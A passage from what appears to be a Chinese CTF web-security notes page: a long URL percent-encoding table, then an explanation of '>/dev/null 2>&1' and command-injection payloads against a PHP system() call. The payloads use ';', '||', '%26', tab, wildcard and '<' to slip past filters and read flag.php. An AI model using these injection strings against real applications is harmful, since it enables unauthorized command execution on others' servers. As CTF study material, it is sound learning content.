<td style="text-align:left">%46</td>
</tr>
<tr>
<td style="text-align:left">G</td>
<td style="text-align:left">%47</td>
<td style="text-align:left">%47</td>
</tr>
<tr>
<td style="text-align:left">H</td>
<td style="text-align:left">%48</td>
<td style="text-align:left">%48</td>
</tr>
<tr>
<td style="text-align:left">I</td>
<td style="text-align:left">%49</td>
<td style="text-align:left">%49</td>
</tr>
<tr>
<td style="text-align:left">J</td>
<td style="text-align:left">%4A</td>
<td style="text-align:left">%4A</td>
</tr>
<tr>
<td style="text-align:left">K</td>
<td style="text-align:left">%4B</td>
<td style="text-align:left">%4B</td>
</tr>
<tr>
<td style="text-align:left">L</td>
<td style="text-align:left">%4C</td>
<td style="text-align:left">%4C</td>
</tr>
<tr>
<td style="text-align:left">M</td>
<td style="text-align:left">%4D</td>
<td style="text-align:left">%4D</td>
</tr>
<tr>
<td style="text-align:left">N</td>
<td style="text-align:left">%4E</td>
<td style="text-align:left">%4E</td>
</tr>
<tr>
<td style="text-align:left">O</td>
<td style="text-align:left">%4F</td>
<td style="text-align:left">%4F</td>
</tr>
<tr>
<td style="text-align:left">P</td>
<td style="text-align:left">%50</td>
<td style="text-align:left">%50</td>
</tr>
<tr>
<td style="text-align:left">Q</td>
<td style="text-align:left">%51</td>
<td style="text-align:left">%51</td>
</tr>
<tr>
<td style="text-align:left">R</td>
<td style="text-align:left">%52</td>
<td style="text-align:left">%52</td>
</tr>
<tr>
<td style="text-align:left">S</td>
<td style="text-align:left">%53</td>
<td style="text-align:left">%53</td>
</tr>
<tr>
<td style="text-align:left">T</td>
<td style="text-align:left">%54</td>
<td style="text-align:left">%54</td>
</tr>
<tr>
<td style="text-align:left">U</td>
<td style="text-align:left">%55</td>
<td style="text-align:left">%55</td>
</tr>
<tr>
<td style="text-align:left">V</td>
<td style="text-align:left">%56</td>
<td style="text-align:left">%56</td>
</tr>
<tr>
<td style="text-align:left">W</td>
<td style="text-align:left">%57</td>
<td style="text-align:left">%57</td>
</tr>
<tr>
<td style="text-align:left">X</td>
<td style="text-align:left">%58</td>
<td style="text-align:left">%58</td>
</tr>
<tr>
<td style="text-align:left">Y</td>
<td style="text-align:left">%59</td>
<td style="text-align:left">%59</td>
</tr>
<tr>
<td style="text-align:left">Z</td>
<td style="text-align:left">%5A</td>
<td style="text-align:left">%5A</td>
</tr>
<tr>
<td style="text-align:left">[</td>
<td style="text-align:left">%5B</td>
<td style="text-align:left">%5B</td>
</tr>
<tr>
<td style="text-align:left">\</td>
<td style="text-align:left">%5C</td>
<td style="text-align:left">%5C</td>
</tr>
<tr>
<td style="text-align:left">]</td>
<td style="text-align:left">%5D</td>
<td style="text-align:left">%5D</td>
</tr>
<tr>
<td style="text-align:left">^</td>
<td style="text-align:left">%5E</td>
<td style="text-align:left">%5E</td>
</tr>
<tr>
<td style="text-align:left">_</td>
<td style="text-align:left">%5F</td>
<td style="text-align:left">%5F</td>
</tr>
<tr>
<td style="text-align:left">`     | %60               | %60        |</td>
</tr>
<tr>
<td style="text-align:left">a</td>
<td style="text-align:left">%61</td>
<td style="text-align:left">%61</td>
</tr>
<tr>
<td style="text-align:left">b</td>
<td style="text-align:left">%62</td>
<td style="text-align:left">%62</td>
</tr>
<tr>
<td style="text-align:left">c</td>
<td style="text-align:left">%63</td>
<td style="text-align:left">%63</td>
</tr>
<tr>
<td style="text-align:left">d</td>
<td style="text-align:left">%64</td>
<td style="text-align:left">%64</td>
</tr>
<tr>
<td style="text-align:left">e</td>
<td style="text-align:left">%65</td>
<td style="text-align:left">%65</td>
</tr>
<tr>
<td style="text-align:left">f</td>
<td style="text-align:left">%66</td>
<td style="text-align:left">%66</td>
</tr>
<tr>
<td style="text-align:left">g</td>
<td style="text-align:left">%67</td>
<td style="text-align:left">%67</td>
</tr>
<tr>
<td style="text-align:left">h</td>
<td style="text-align:left">%68</td>
<td style="text-align:left">%68</td>
</tr>
<tr>
<td style="text-align:left">i</td>
<td style="text-align:left">%69</td>
<td style="text-align:left">%69</td>
</tr>
<tr>
<td style="text-align:left">j</td>
<td style="text-align:left">%6A</td>
<td style="text-align:left">%6A</td>
</tr>
<tr>
<td style="text-align:left">k</td>
<td style="text-align:left">%6B</td>
<td style="text-align:left">%6B</td>
</tr>
<tr>
<td style="text-align:left">l</td>
<td style="text-align:left">%6C</td>
<td style="text-align:left">%6C</td>
</tr>
<tr>
<td style="text-align:left">m</td>
<td style="text-align:left">%6D</td>
<td style="text-align:left">%6D</td>
</tr>
<tr>
<td style="text-align:left">n</td>
<td style="text-align:left">%6E</td>
<td style="text-align:left">%6E</td>
</tr>
<tr>
<td style="text-align:left">o</td>
<td style="text-align:left">%6F</td>
<td style="text-align:left">%6F</td>
</tr>
<tr>
<td style="text-align:left">p</td>
<td style="text-align:left">%70</td>
<td style="text-align:left">%70</td>
</tr>
<tr>
<td style="text-align:left">q</td>
<td style="text-align:left">%71</td>
<td style="text-align:left">%71</td>
</tr>
<tr>
<td style="text-align:left">r</td>
<td style="text-align:left">%72</td>
<td style="text-align:left">%72</td>
</tr>
<tr>
<td style="text-align:left">s</td>
<td style="text-align:left">%73</td>
<td style="text-align:left">%73</td>
</tr>
<tr>
<td style="text-align:left">t</td>
<td style="text-align:left">%74</td>
<td style="text-align:left">%74</td>
</tr>
<tr>
<td style="text-align:left">u</td>
<td style="text-align:left">%75</td>
<td style="text-align:left">%75</td>
</tr>
<tr>
<td style="text-align:left">v</td>
<td style="text-align:left">%76</td>
<td style="text-align:left">%76</td>
</tr>
<tr>
<td style="text-align:left">w</td>
<td style="text-align:left">%77</td>
<td style="text-align:left">%77</td>
</tr>
<tr>
<td style="text-align:left">x</td>
<td style="text-align:left">%78</td>
<td style="text-align:left">%78</td>
</tr>
<tr>
<td style="text-align:left">y</td>
<td style="text-align:left">%79</td>
<td style="text-align:left">%79</td>
</tr>
<tr>
<td style="text-align:left">z</td>
<td style="text-align:left">%7A</td>
<td style="text-align:left">%7A</td>
</tr>
<tr>
<td style="text-align:left">{</td>
<td style="text-align:left">%7B</td>
<td style="text-align:left">%7B</td>
</tr>
<tr>
<td style="text-align:left">|</td>
<td style="text-align:left">%7C</td>
<td style="text-align:left">%7C</td>
</tr>
<tr>
<td style="text-align:left">}</td>
<td style="text-align:left">%7D</td>
<td style="text-align:left">%7D</td>
</tr>
<tr>
<td style="text-align:left">~</td>
<td style="text-align:left">%7E</td>
<td style="text-align:left">%7E</td>
</tr>
<tr>
<td style="text-align:left"></td>
<td style="text-align:left">%7F</td>
<td style="text-align:left">%7F</td>
</tr>
<tr>
<td style="text-align:left">`     | %80               | %E2%82%AC  |</td>
</tr>
<tr>
<td style="text-align:left"></td>
<td style="text-align:left">%81</td>
<td style="text-align:left">%81</td>
</tr>
<tr>
<td style="text-align:left">‚</td>
<td style="text-align:left">%82</td>
<td style="text-align:left">%E2%80%9A</td>
</tr>
<tr>
<td style="text-align:left">ƒ</td>
<td style="text-align:left">%83</td>
<td style="text-align:left">%C6%92</td>
</tr>
<tr>
<td style="text-align:left">„</td>
<td style="text-align:left">%84</td>
<td style="text-align:left">%E2%80%9E</td>
</tr>
<tr>
<td style="text-align:left">…</td>
<td style="text-align:left">%85</td>
<td style="text-align:left">%E2%80%A6</td>
</tr>
<tr>
<td style="text-align:left">†</td>
<td style="text-align:left">%86</td>
<td style="text-align:left">%E2%80%A0</td>
</tr>
<tr>
<td style="text-align:left">‡</td>
<td style="text-align:left">%87</td>
<td style="text-align:left">%E2%80%A1</td>
</tr>
<tr>
<td style="text-align:left">ˆ</td>
<td style="text-align:left">%88</td>
<td style="text-align:left">%CB%86</td>
</tr>
<tr>
<td style="text-align:left">‰</td>
<td style="text-align:left">%89</td>
<td style="text-align:left">%E2%80%B0</td>
</tr>
<tr>
<td style="text-align:left">Š</td>
<td style="text-align:left">%8A</td>
<td style="text-align:left">%C5%A0</td>
</tr>
<tr>
<td style="text-align:left">‹</td>
<td style="text-align:left">%8B</td>
<td style="text-align:left">%E2%80%B9</td>
</tr>
<tr>
<td style="text-align:left">Œ</td>
<td style="text-align:left">%8C</td>
<td style="text-align:left">%C5%92</td>
</tr>
<tr>
<td style="text-align:left"></td>
<td style="text-align:left">%8D</td>
<td style="text-align:left">%C5%8D</td>
</tr>
<tr>
<td style="text-align:left">Ž</td>
<td style="text-align:left">%8E</td>
<td style="text-align:left">%C5%BD</td>
</tr>
<tr>
<td style="text-align:left"></td>
<td style="text-align:left">%8F</td>
<td style="text-align:left">%8F</td>
</tr>
<tr>
<td style="text-align:left"></td>
<td style="text-align:left">%90</td>
<td style="text-align:left">%C2%90</td>
</tr>
<tr>
<td style="text-align:left">‘</td>
<td style="text-align:left">%91</td>
<td style="text-align:left">%E2%80%98</td>
</tr>
<tr>
<td style="text-align:left">’</td>
<td style="text-align:left">%92</td>
<td style="text-align:left">%E2%80%99</td>
</tr>
<tr>
<td style="text-align:left">“</td>
<td style="text-align:left">%93</td>
<td style="text-align:left">%E2%80%9C</td>
</tr>
<tr>
<td style="text-align:left">”</td>
<td style="text-align:left">%94</td>
<td style="text-align:left">%E2%80%9D</td>
</tr>
<tr>
<td style="text-align:left">•</td>
<td style="text-align:left">%95</td>
<td style="text-align:left">%E2%80%A2</td>
</tr>
<tr>
<td style="text-align:left">–</td>
<td style="text-align:left">%96</td>
<td style="text-align:left">%E2%80%93</td>
</tr>
<tr>
<td style="text-align:left">—</td>
<td style="text-align:left">%97</td>
<td style="text-align:left">%E2%80%94</td>
</tr>
<tr>
<td style="text-align:left">˜</td>
<td style="text-align:left">%98</td>
<td style="text-align:left">%CB%9C</td>
</tr>
<tr>
<td style="text-align:left">™</td>
<td style="text-align:left">%99</td>
<td style="text-align:left">%E2%84</td>
</tr>
<tr>
<td style="text-align:left">š</td>
<td style="text-align:left">%9A</td>
<td style="text-align:left">%C5%A1</td>
</tr>
<tr>
<td style="text-align:left">›</td>
<td style="text-align:left">%9B</td>
<td style="text-align:left">%E2%80</td>
</tr>
<tr>
<td style="text-align:left">œ</td>
<td style="text-align:left">%9C</td>
<td style="text-align:left">%C5%93</td>
</tr>
<tr>
<td style="text-align:left"></td>
<td style="text-align:left">%9D</td>
<td style="text-align:left">%9D</td>
</tr>
<tr>
<td style="text-align:left">ž</td>
<td style="text-align:left">%9E</td>
<td style="text-align:left">%C5%BE</td>
</tr>
<tr>
<td style="text-align:left">Ÿ</td>
<td style="text-align:left">%9F</td>
<td style="text-align:left">%C5%B8</td>
</tr>
<tr>
<td style="text-align:left"></td>
<td style="text-align:left">%A0</td>
<td style="text-align:left">%C2%A0</td>
</tr>
<tr>
<td style="text-align:left">¡</td>
<td style="text-align:left">%A1</td>
<td style="text-align:left">%C2%A1</td>
</tr>
<tr>
<td style="text-align:left">¢</td>
<td style="text-align:left">%A2</td>
<td style="text-align:left">%C2%A2</td>
</tr>
<tr>
<td style="text-align:left">£</td>
<td style="text-align:left">%A3</td>
<td style="text-align:left">%C2%A3</td>
</tr>
<tr>
<td style="text-align:left">¤</td>
<td style="text-align:left">%A4</td>
<td style="text-align:left">%C2%A4</td>
</tr>
<tr>
<td style="text-align:left">¥</td>
<td style="text-align:left">%A5</td>
<td style="text-align:left">%C2%A5</td>
</tr>
<tr>
<td style="text-align:left">¦</td>
<td style="text-align:left">%A6</td>
<td style="text-align:left">%C2%A6</td>
</tr>
<tr>
<td style="text-align:left">§</td>
<td style="text-align:left">%A7</td>
<td style="text-align:left">%C2%A7</td>
</tr>
<tr>
<td style="text-align:left">¨</td>
<td style="text-align:left">%A8</td>
<td style="text-align:left">%C2%A8</td>
</tr>
<tr>
<td style="text-align:left">©</td>
<td style="text-align:left">%A9</td>
<td style="text-align:left">%C2%A9</td>
</tr>
<tr>
<td style="text-align:left">ª</td>
<td style="text-align:left">%AA</td>
<td style="text-align:left">%C2%AA</td>
</tr>
<tr>
<td style="text-align:left">«</td>
<td style="text-align:left">%AB</td>
<td style="text-align:left">%C2%AB</td>
</tr>
<tr>
<td style="text-align:left">¬</td>
<td style="text-align:left">%AC</td>
<td style="text-align:left">%C2%AC</td>
</tr>
<tr>
<td style="text-align:left">­</td>
<td style="text-align:left">%AD</td>
<td style="text-align:left">%C2%AD</td>
</tr>
<tr>
<td style="text-align:left">®</td>
<td style="text-align:left">%AE</td>
<td style="text-align:left">%C2%AE</td>
</tr>
<tr>
<td style="text-align:left">¯</td>
<td style="text-align:left">%AF</td>
<td style="text-align:left">%C2%AF</td>
</tr>
<tr>
<td style="text-align:left">°</td>
<td style="text-align:left">%B0</td>
<td style="text-align:left">%C2%B0</td>
</tr>
<tr>
<td style="text-align:left">±</td>
<td style="text-align:left">%B1</td>
<td style="text-align:left">%C2%B1</td>
</tr>
<tr>
<td style="text-align:left">²</td>
<td style="text-align:left">%B2</td>
<td style="text-align:left">%C2%B2</td>
</tr>
<tr>
<td style="text-align:left">³</td>
<td style="text-align:left">%B3</td>
<td style="text-align:left">%C2%B3</td>
</tr>
<tr>
<td style="text-align:left">´</td>
<td style="text-align:left">%B4</td>
<td style="text-align:left">%C2%B4</td>
</tr>
<tr>
<td style="text-align:left">µ</td>
<td style="text-align:left">%B5</td>
<td style="text-align:left">%C2%B5</td>
</tr>
<tr>
<td style="text-align:left">¶</td>
<td style="text-align:left">%B6</td>
<td style="text-align:left">%C2%B6</td>
</tr>
<tr>
<td style="text-align:left">·</td>
<td style="text-align:left">%B7</td>
<td style="text-align:left">%C2%B7</td>
</tr>
<tr>
<td style="text-align:left">¸</td>
<td style="text-align:left">%B8</td>
<td style="text-align:left">%C2%B8</td>
</tr>
<tr>
<td style="text-align:left">¹</td>
<td style="text-align:left">%B9</td>
<td style="text-align:left">%C2%B9</td>
</tr>
<tr>
<td style="text-align:left">º</td>
<td style="text-align:left">%BA</td>
<td style="text-align:left">%C2%BA</td>
</tr>
<tr>
<td style="text-align:left">»</td>
<td style="text-align:left">%BB</td>
<td style="text-align:left">%C2%BB</td>
</tr>
<tr>
<td style="text-align:left">¼</td>
<td style="text-align:left">%BC</td>
<td style="text-align:left">%C2%BC</td>
</tr>
<tr>
<td style="text-align:left">½</td>
<td style="text-align:left">%BD</td>
<td style="text-align:left">%C2%BD</td>
</tr>
<tr>
<td style="text-align:left">¾</td>
<td style="text-align:left">%BE</td>
<td style="text-align:left">%C2%BE</td>
</tr>
<tr>
<td style="text-align:left">¿</td>
<td style="text-align:left">%BF</td>
<td style="text-align:left">%C2%BF</td>
</tr>
<tr>
<td style="text-align:left">À</td>
<td style="text-align:left">%C0</td>
<td style="text-align:left">%C3%80</td>
</tr>
<tr>
<td style="text-align:left">Á</td>
<td style="text-align:left">%C1</td>
<td style="text-align:left">%C3%81</td>
</tr>
<tr>
<td style="text-align:left">Â</td>
<td style="text-align:left">%C2</td>
<td style="text-align:left">%C3%82</td>
</tr>
<tr>
<td style="text-align:left">Ã</td>
<td style="text-align:left">%C3</td>
<td style="text-align:left">%C3%83</td>
</tr>
<tr>
<td style="text-align:left">Ä</td>
<td style="text-align:left">%C4</td>
<td style="text-align:left">%C3%84</td>
</tr>
<tr>
<td style="text-align:left">Å</td>
<td style="text-align:left">%C5</td>
<td style="text-align:left">%C3%85</td>
</tr>
<tr>
<td style="text-align:left">Æ</td>
<td style="text-align:left">%C6</td>
<td style="text-align:left">%C3%86</td>
</tr>
<tr>
<td style="text-align:left">Ç</td>
<td style="text-align:left">%C7</td>
<td style="text-align:left">%C3%87</td>
</tr>
<tr>
<td style="text-align:left">È</td>
<td style="text-align:left">%C8</td>
<td style="text-align:left">%C3%88</td>
</tr>
<tr>
<td style="text-align:left">É</td>
<td style="text-align:left">%C9</td>
<td style="text-align:left">%C3%89</td>
</tr>
<tr>
<td style="text-align:left">Ê</td>
<td style="text-align:left">%CA</td>
<td style="text-align:left">%C3%8A</td>
</tr>
<tr>
<td style="text-align:left">Ë</td>
<td style="text-align:left">%CB</td>
<td style="text-align:left">%C3%8B</td>
</tr>
<tr>
<td style="text-align:left">Ì</td>
<td style="text-align:left">%CC</td>
<td style="text-align:left">%C3%8C</td>
</tr>
<tr>
<td style="text-align:left">Í</td>
<td style="text-align:left">%CD</td>
<td style="text-align:left">%C3%8D</td>
</tr>
<tr>
<td style="text-align:left">Î</td>
<td style="text-align:left">%CE</td>
<td style="text-align:left">%C3%8E</td>
</tr>
<tr>
<td style="text-align:left">Ï</td>
<td style="text-align:left">%CF</td>
<td style="text-align:left">%C3%8F</td>
</tr>
<tr>
<td style="text-align:left">Ð</td>
<td style="text-align:left">%D0</td>
<td style="text-align:left">%C3%90</td>
</tr>
<tr>
<td style="text-align:left">Ñ</td>
<td style="text-align:left">%D1</td>
<td style="text-align:left">%C3%91</td>
</tr>
<tr>
<td style="text-align:left">Ò</td>
<td style="text-align:left">%D2</td>
<td style="text-align:left">%C3%92</td>
</tr>
<tr>
<td style="text-align:left">Ó</td>
<td style="text-align:left">%D3</td>
<td style="text-align:left">%C3%93</td>
</tr>
<tr>
<td style="text-align:left">Ô</td>
<td style="text-align:left">%D4</td>
<td style="text-align:left">%C3%94</td>
</tr>
<tr>
<td style="text-align:left">Õ</td>
<td style="text-align:left">%D5</td>
<td style="text-align:left">%C3%95</td>
</tr>
<tr>
<td style="text-align:left">Ö</td>
<td style="text-align:left">%D6</td>
<td style="text-align:left">%C3%96</td>
</tr>
<tr>
<td style="text-align:left">×</td>
<td style="text-align:left">%D7</td>
<td style="text-align:left">%C3%97</td>
</tr>
<tr>
<td style="text-align:left">Ø</td>
<td style="text-align:left">%D8</td>
<td style="text-align:left">%C3%98</td>
</tr>
<tr>
<td style="text-align:left">Ù</td>
<td style="text-align:left">%D9</td>
<td style="text-align:left">%C3%99</td>
</tr>
<tr>
<td style="text-align:left">Ú</td>
<td style="text-align:left">%DA</td>
<td style="text-align:left">%C3%9A</td>
</tr>
<tr>
<td style="text-align:left">Û</td>
<td style="text-align:left">%DB</td>
<td style="text-align:left">%C3%9B</td>
</tr>
<tr>
<td style="text-align:left">Ü</td>
<td style="text-align:left">%DC</td>
<td style="text-align:left">%C3%9C</td>
</tr>
<tr>
<td style="text-align:left">Ý</td>
<td style="text-align:left">%DD</td>
<td style="text-align:left">%C3%9D</td>
</tr>
<tr>
<td style="text-align:left">Þ</td>
<td style="text-align:left">%DE</td>
<td style="text-align:left">%C3%9E</td>
</tr>
<tr>
<td style="text-align:left">ß</td>
<td style="text-align:left">%DF</td>
<td style="text-align:left">%C3%9F</td>
</tr>
<tr>
<td style="text-align:left">à</td>
<td style="text-align:left">%E0</td>
<td style="text-align:left">%C3%A0</td>
</tr>
<tr>
<td style="text-align:left">á</td>
<td style="text-align:left">%E1</td>
<td style="text-align:left">%C3%A1</td>
</tr>
<tr>
<td style="text-align:left">â</td>
<td style="text-align:left">%E2</td>
<td style="text-align:left">%C3%A2</td>
</tr>
<tr>
<td style="text-align:left">ã</td>
<td style="text-align:left">%E3</td>
<td style="text-align:left">%C3%A3</td>
</tr>
<tr>
<td style="text-align:left">ä</td>
<td style="text-align:left">%E4</td>
<td style="text-align:left">%C3%A4</td>
</tr>
<tr>
<td style="text-align:left">å</td>
<td style="text-align:left">%E5</td>
<td style="text-align:left">%C3%A5</td>
</tr>
<tr>
<td style="text-align:left">æ</td>
<td style="text-align:left">%E6</td>
<td style="text-align:left">%C3%A6</td>
</tr>
<tr>
<td style="text-align:left">ç</td>
<td style="text-align:left">%E7</td>
<td style="text-align:left">%C3%A7</td>
</tr>
<tr>
<td style="text-align:left">è</td>
<td style="text-align:left">%E8</td>
<td style="text-align:left">%C3%A8</td>
</tr>
<tr>
<td style="text-align:left">é</td>
<td style="text-align:left">%E9</td>
<td style="text-align:left">%C3%A9</td>
</tr>
<tr>
<td style="text-align:left">ê</td>
<td style="text-align:left">%EA</td>
<td style="text-align:left">%C3%AA</td>
</tr>
<tr>
<td style="text-align:left">ë</td>
<td style="text-align:left">%EB</td>
<td style="text-align:left">%C3%AB</td>
</tr>
<tr>
<td style="text-align:left">ì</td>
<td style="text-align:left">%EC</td>
<td style="text-align:left">%C3%AC</td>
</tr>
<tr>
<td style="text-align:left">í</td>
<td style="text-align:left">%ED</td>
<td style="text-align:left">%C3%AD</td>
</tr>
<tr>
<td style="text-align:left">î</td>
<td style="text-align:left">%EE</td>
<td style="text-align:left">%C3%AE</td>
</tr>
<tr>
<td style="text-align:left">ï</td>
<td style="text-align:left">%EF</td>
<td style="text-align:left">%C3%AF</td>
</tr>
<tr>
<td style="text-align:left">ð</td>
<td style="text-align:left">%F0</td>
<td style="text-align:left">%C3%B0</td>
</tr>
<tr>
<td style="text-align:left">ñ</td>
<td style="text-align:left">%F1</td>
<td style="text-align:left">%C3%B1</td>
</tr>
<tr>
<td style="text-align:left">ò</td>
<td style="text-align:left">%F2</td>
<td style="text-align:left">%C3%B2</td>
</tr>
<tr>
<td style="text-align:left">ó</td>
<td style="text-align:left">%F3</td>
<td style="text-align:left">%C3%B3</td>
</tr>
<tr>
<td style="text-align:left">ô</td>
<td style="text-align:left">%F4</td>
<td style="text-align:left">%C3%B4</td>
</tr>
<tr>
<td style="text-align:left">õ</td>
<td style="text-align:left">%F5</td>
<td style="text-align:left">%C3%B5</td>
</tr>
<tr>
<td style="text-align:left">ö</td>
<td style="text-align:left">%F6</td>
<td style="text-align:left">%C3%B6</td>
</tr>
<tr>
<td style="text-align:left">÷</td>
<td style="text-align:left">%F7</td>
<td style="text-align:left">%C3%B7</td>
</tr>
<tr>
<td style="text-align:left">ø</td>
<td style="text-align:left">%F8</td>
<td style="text-align:left">%C3%B8</td>
</tr>
<tr>
<td style="text-align:left">ù</td>
<td style="text-align:left">%F9</td>
<td style="text-align:left">%C3%B9</td>
</tr>
<tr>
<td style="text-align:left">ú</td>
<td style="text-align:left">%FA</td>
<td style="text-align:left">%C3%BA</td>
</tr>
<tr>
<td style="text-align:left">û</td>
<td style="text-align:left">%FB</td>
<td style="text-align:left">%C3%BB</td>
</tr>
<tr>
<td style="text-align:left">ü</td>
<td style="text-align:left">%FC</td>
<td style="text-align:left">%C3%BC</td>
</tr>
<tr>
<td style="text-align:left">ý</td>
<td style="text-align:left">%FD</td>
<td style="text-align:left">%C3%BD</td>
</tr>
<tr>
<td style="text-align:left">þ</td>
<td style="text-align:left">%FE</td>
<td style="text-align:left">%C3%BE</td>
</tr>
<tr>
<td style="text-align:left">ÿ</td>
<td style="text-align:left">%FF</td>
<td style="text-align:left">%C3%BF</td>
</tr>
</tbody>
</table>
<h1 id="devnull-21不回显以及system利用"><a class="anchor" href="#devnull-21不回显以及system利用">#</a> &gt;/dev/null 2&gt;&amp;1 不回显，以及 system 利用</h1>
<p>1. <code>&gt;</code>  是 Shell 中的 <strong>输出重定向</strong> 操作符。它将命令的 <strong>标准输出（stdout）</strong> 重定向到某个指定的目标位置</p>
<p>2. <code>/dev/null</code>  是一个特殊的设备文件，通常被称为 <strong>&quot;黑洞&quot;</strong>，因为任何写入  <code>/dev/null</code>  的数据都会被 <strong>丢弃</strong></p>
<p>3.<strong> <code>2&gt;&amp;1</code> </strong>: 这是一个复杂的重定向语法，表示将 <strong>标准错误（stderr）</strong> 重定向到 <strong>标准输出（stdout）</strong> 的位置</p>
<ul>
<li><code>2</code> ：表示 <strong>标准错误</strong>（stderr），它是文件描述符 2。</li>
<li><code>&gt;&amp;1</code> ：表示将文件描述符 2（stderr）重定向到文件描述符 1（stdout）。在这个上下文中， <code>1</code>  是标准输出的文件描述符， <code>&amp;</code>  符号告诉 Shell 重定向到另一个文件描述符。</li>
</ul>
<h2 id="绕过"><a class="anchor" href="#绕过">#</a> 绕过：</h2>
<ul>
<li>
<p>在前面加上 <code>;</code> ：</p>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>c<span class="token operator">=</span>tac<span class="token operator">%</span><span class="token number">20</span>flag<span class="token operator">.</span>php<span class="token punctuation">;</span>     <span class="token comment"># 这里是加上了分号作为分隔</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">#【注意】：这里不需要去手动闭合括号</span></pre></td></tr></table></figure></li>
<li>
<p>前面加上 <code>换行符%0a</code></p>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>c<span class="token operator">=</span>tac<span class="token operator">%</span><span class="token number">20</span>flag<span class="token operator">.</span>php<span class="token operator">%</span><span class="token number">0</span>a     <span class="token comment"># 加上换行符</span></pre></td></tr></table></figure></li>
<li>
<p>前面加上 <code>||</code> ，使只执行前面的那条命令</p>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>c<span class="token operator">=</span>tac<span class="token operator">%</span><span class="token number">20</span>flag<span class="token operator">.</span><span class="token class-name">php</span><span class="token operator">||</span>    <span class="token comment"># 加上 ||, 只执行前面的命令</span></pre></td></tr></table></figure></li>
<li>
<p>前面加上 <code>&amp;</code> (需要用 url 编码 %26)</p>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>c<span class="token operator">=</span>tac<span class="token operator">%</span><span class="token number">20</span>flag<span class="token operator">.</span>php<span class="token operator">%</span><span class="token number">26</span>    <span class="token comment"># 加上 & amp;,&amp; 在 URL 查询字符串中通常会被视为参数分隔符</span></pre></td></tr></table></figure></li>
<li></li>
</ul>
<p>** 总结：** 使用 &quot;;&quot; &quot;||&quot; &quot;&amp;&quot; &quot;&amp;&amp;&quot; 分隔</p>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">/</span>dev<span class="token operator">/</span><span class="token constant">null</span> <span class="token number">2</span><span class="token operator">></span><span class="token operator">&amp;</span><span class="token number">1</span> 意思是将标准输出和标准错误都重定向到 <span class="token operator">/</span>dev<span class="token operator">/</span><span class="token constant">null</span> 即不回显</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">;</span> <span class="token comment">// 分号</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">|</span> <span class="token comment">// 只执行后面那条命令</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token operator">||</span> <span class="token comment">// 只执行前面那条命令</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token operator">&amp;</span> <span class="token comment">// 两条命令都会执行 (&amp; 在 URL 查询字符串中通常会被视为参数分隔符)</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token operator">&amp;&amp;</span> <span class="token comment">// 两条命令都会执行 (&amp;&amp; 在命令行中 用于 条件执行。当你在两个命令之间使用 &amp;&amp; 时，第一个命令成功（退出状态码为 0）时，才会执行第二个命令。如果第一个命令失败（退出状态码非 0），则第二个命令不会被执行)</span></pre></td></tr></table></figure><h3 id="system利用"><a class="anchor" href="#system利用">#</a> system 利用：</h3>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>c<span class="token operator">=</span>tac<span class="token operator">%</span><span class="token number">20</span>flag<span class="token operator">.</span>php<span class="token operator">%</span><span class="token number">26</span> <span class="token comment">#%26 是 & amp;,`&amp;` 进行分隔参数</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    </pre></td></tr><tr><td data-num="3"></td><td><pre>c<span class="token operator">=</span>tac<span class="token operator">%</span><span class="token number">20</span>fla<span class="token operator">*</span><span class="token operator">.</span>php<span class="token operator">%</span><span class="token number">26</span> <span class="token comment">#利用 `fla*` 去绕过</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    </pre></td></tr><tr><td data-num="5"></td><td><pre>c<span class="token operator">=</span>tac<span class="token operator">%</span><span class="token number">09</span>fla<span class="token operator">*</span><span class="token operator">.</span>php<span class="token operator">%</span><span class="token number">26</span> <span class="token comment">#过滤空格，利用 `tab (%09)` 来代替</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    </pre></td></tr><tr><td data-num="7"></td><td><pre>c<span class="token operator">=</span>tac<span class="token operator">&lt;</span>fla\g<span class="token operator">.</span><span class="token class-name">php</span><span class="token operator">||</span>  <span class="token comment">#`数字`、`*`、`$` 被过滤，tab 不能用了，$&#123;IFS&#125; 也不行，可以用 `&lt;` 或者 `&lt;>` 进行绕过</span></pre></td></tr><tr><td data-num="8"></td><td><pre> </pre></td></tr><tr><td data-num="9"></td><td><pre>c<span class="token operator">=</span>nl<span class="token operator">&lt;</span>fla\g<span class="token operator">.</span><span class="token class-name">php</span><span class="token operator">||</span>   <span class="token comment">##nl：显示的时候，顺便输出行号，flag 在源代码中</span></pre></td></tr><tr><td 